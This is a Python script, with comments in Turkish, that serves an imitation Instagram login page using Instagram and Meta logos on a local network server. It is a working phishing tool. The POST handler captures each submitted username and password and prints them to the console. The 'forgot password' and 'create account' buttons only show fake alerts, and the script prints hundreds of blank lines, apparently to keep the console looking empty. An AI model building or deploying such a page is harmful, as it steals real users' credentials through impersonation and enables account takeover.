import http.server
import socketserver
import socket
from urllib.parse import parse_qs

PORT = 8000

html_code = """
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Giriş Sayfası</title>
<style>
  /* (Buraya yukarıdaki css kodlarını aynen yapıştırabilirsin) */
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body { height: 100%; background-color: #f0f0f0; font-family: Arial, sans-serif; }
  .resim-kapsayici { width: 100%; height: 100px; display: flex; justify-content: center; align-items: center; margin-top: 20px; }
  .ortali-resim { max-width: 70px; height: auto; }
  form.form-kapsayici { margin: 30px auto 0; display: flex; flex-direction: column; align-items: center; gap: 15px; width: 90%; max-width: 320px; }
  form.form-kapsayici input { padding: 12px 16px; width: 100%; border: 1px solid #ccc; border-radius: 8px; font-size: 15px; outline: none; box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05); }
  button.giris-buton { padding: 12px 16px; width: 100%; background-color: #0f7eed; color: white; font-size: 15px; border: none; border-radius: 50px; cursor: pointer; transition: background-color 0.3s ease; }
  button.giris-buton:hover { background-color: #007fff; }
  p.sifremi-unuttum { text-align: center; font-size: 14px; color: #00376b; cursor: pointer; user-select: none; margin-top: 10px; }
  .yeni-hesap-kapsayici { margin: 50px auto 40px; width: 90%; max-width: 320px; display: flex; justify-content: center; }
  button.yeni-hesap-buton { padding: 12px 16px; width: 100%; background: transparent; color: #2575fc; font-size: 15px; border: 2px solid #007fff; border-radius: 50px; cursor: pointer; transition: background 0.4s ease, color 0.4s ease; box-shadow: none; }
  button.yeni-hesap-buton:hover { background-color: #007fff; color: white; }
  .resim-kapsayici2 { width: 100%; height: 80px; display: flex; justify-content: center; align-items: center; margin-top: 40px; }
  .ortali-resim2 { max-width: 70px; height: auto; }
</style>
</head>
<body>

<div class="resim-kapsayici">
  <img src="static/instagram.png" alt="Ortalanmış Resim" class="ortali-resim" />
</div>

<form method="POST" class="form-kapsayici" action="/">
  <input type="text" name="kullanici_adi" placeholder="Kullanıcı adı, e-posta veya cep numarası" required />
  <input type="password" name="sifre" placeholder="Şifre" required />
  <button type="submit" class="giris-buton">Giriş Yap</button>

  <p class="sifremi-unuttum" onclick="alert('Güvenlik Nedeniyle Erişilemez.')">Şifreni mi unuttun?</p>
</form>

<div class="yeni-hesap-kapsayici">
  <button type="button" class="yeni-hesap-buton" onclick="alert('Hata')">Yeni Hesap Oluştur</button>
</div>

<div class="resim-kapsayici2">
  <img src="static/meta.png" alt="Yeni Resim" class="ortali-resim2" />
</div>

</body>
</html>
"""


class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        data = parse_qs(post_data)

        kullanici_adi = data.get('kullanici_adi', [''])[0]
        sifre = data.get('sifre', [''])[0]

        print(f"Gelen kullanıcı adı: {kullanici_adi}")
        print(f"Gelen şifre: {sifre}")

        # Cevap olarak formun aynı sayfasını geri gönderiyoruz:
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html_code.encode('utf-8'))


# Yerel IP'yi bul:
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

with socketserver.TCPServer(("0.0.0.0", PORT), MyHandler) as httpd:
    print("\n"*500)

    httpd.serve_forever()